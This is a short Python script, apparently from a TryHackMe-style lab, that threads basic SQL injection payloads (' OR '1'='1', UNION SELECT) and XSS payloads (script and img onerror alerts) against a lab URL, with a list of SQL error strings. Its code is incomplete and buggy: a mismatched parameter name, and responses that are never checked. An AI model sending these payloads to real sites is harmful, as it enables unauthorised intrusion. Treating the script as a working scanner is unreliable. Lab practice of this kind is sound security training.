import requests
import re
import threading
url = "http://python.thm/labs/lab2/greetings.php?id="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],


    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]
def scan(vln_type, payload):
    response=requests.get(url,params={"id":payload})
    content=response.text.lower()

    if vuln_type == "SQLi":
        print(f"Testing SQLi payload: {payload}")
    
    elif vuln_type == "XSS":
        print(f"Testing XSS payload: {payload}")

threads=[]
for vuln_type, payload_list in payloads.items():

    for payload in payload_list:
        t=threading.Thread(target=scan,args=(vuln_type,payload))
        threads.append(t)
        t.start()

for t in threads:
    t.join()